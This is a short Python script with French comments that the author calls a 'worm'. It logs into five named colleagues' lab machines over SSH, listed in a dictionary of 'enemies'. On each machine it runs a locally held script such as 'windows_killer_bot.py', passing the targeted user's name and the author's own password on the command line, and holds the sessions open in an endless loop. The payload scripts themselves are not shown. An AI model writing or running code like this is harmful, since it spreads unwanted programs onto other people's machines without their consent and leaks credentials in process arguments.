#!/bin/bash
# -*- coding: utf-8 -*-

import sys

import time
from pexpect import pxssh
from multiprocessing import Process

"""
/udd/glebreto/Desktop/MesTrucs/Git/Bot/worms.py
cat /udd/glebreto/Desktop/MesTrucs/Git/Bot/windows_killer_bot.py | ssh flamboyant python3 - param1 param2
alors en fait ca marche mais ca se deconnecte à la fin du script...=> boucle while et multiprocess..
"""

mdp = sys.argv[1]  # /!\/!\/!\  c'est bien 1 et l'argu est ici..
index_chemin = int(0)
me_user = "glebreto"


dico_enemis = {"lbourneu": "flamboyant", "mperroti": "bambou", "nalary": "ficus",
               "ynamour": "tong", "rferon": "brugnonier"}


# dico_enemis = {"pi": "192.168.0.11"}

# ce sera pas les mm arguments à passer, donc c'est pas encore fonctionnel
chemin = ["/udd/glebreto/Desktop/MesTrucs/Git/Bot/defense.py",
          "/udd/glebreto/Desktop/MesTrucs/Git/Bot/windows_killer_bot.py"]


def fct_login(me_user_pr, exclu_user_pr, machine_pr, mdp_param):
    """
    Cette fonction est et doit être isolée des autres variables (pas vrai, et pas la peine
    Elle copie un script situé sur mon ordi vers une autre machine
    :param me_user_pr: mon username, plus besoin ac la nvl meth car mis directement ds le bon repert
    :param exclu_user_pr: le username du mec sur lequel le script va être installé et lancé
    :param machine_pr: la machine du mec sur lequel le script va être installé et lancé
    :param mdp_param: mon mot de pass
    :return:
    """
    """
    sess = pxssh.pxssh()
    if not sess.login(machine_pr, me_user_pr, mdp_param):  # TODO là c'est me user..
        print("gros fail de connexion")

    else:
        # pour que ca ecrive pas dans sa propre console..
        sess.sendline("scp niaouli:"+chemin[index_chemin]+" /udd/"+me_user)  # mettre le path defense, pas de ce script hein..

        sess.expect("password")  # TODO peut etre pas pr l'irisa..
        sess.sendline(mdp_param)

        # TODO lors de l'initialisation du script, transferer le mdp et l'user à exclure
        sess.sendline("python3 defense.py "+exclu_user_pr+" "+mdp_param)  # en esperant que ce soit le bon chemin..
        sess.prompt()
        print("devrait marcher...")
        while True:
            time.sleep(10)  # ser a rien mais eviter les désagréments de la boucle infinie
            pass
    """
    # méthode alternative, mieux: (sur le pi, preciser l'user avant machine_pr
    com = pxssh.spawn("/bin/bash -c \" cat "+chemin[index_chemin]+" | "+"ssh "+machine_pr+" python3 - "+exclu_user_pr+" "+mdp_param+" \"")

    com.expect("password")
    com.sendline(mdp_param)
    while True:  # pour maintenir active la connex ssh
            time.sleep(10)  # sert a rien mais eviter les désagréments de la boucle infinie


def parallel(fcts):
    proc = []
    for fc in fcts:
        p = Process(target=fc[0], args=[fc[1], fc[2], fc[3], fc[4]])  # args: les arguments de fct_login
        p.start()
        proc.append(p)
    for p in proc:
        p.join()


listfunc = []
for cle_user in dico_enemis:
    listfunc.append((fct_login, me_user, cle_user, dico_enemis[cle_user], mdp))


parallel(listfunc)  # faire gaffe à ne pas faire voir le mdp dans le shell..

# TODO: ne pas confondre l'user a attaquer et mon identité de connexion!!!!!!!!!!
